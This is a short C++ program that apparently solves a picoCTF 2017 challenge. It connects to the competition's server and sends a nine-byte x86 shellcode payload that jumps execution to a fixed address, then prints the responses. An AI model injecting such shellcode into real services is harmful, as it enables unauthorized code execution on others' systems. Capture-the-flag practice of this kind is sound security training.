#include "tcp_client.hpp"
#include <iostream>

int main()
{
	tcp_client client;

	//shell2017.picoctf.com
	if (!client.try_connect(std::make_pair<std::string, uint16_t>("34.206.4.227", 55049)))
	{
		std::cout << "failed to connect" << std::endl;
	}

	std::cout << client.get_string() << std::endl;
	//std::cout << client.get_string() << std::endl;

	if (!client.send_data(std::vector<byte>({ 0x33, 0xC0, 0x05, 0x40, 0x85, 0x04, 0x08, 0xFF, 0xE0 })))
	{
		std::cout << "failed to send data" << std::endl;
	}

	std::cout << client.get_string() << std::endl;
	std::cout << client.get_string() << std::endl;

	return 0;
}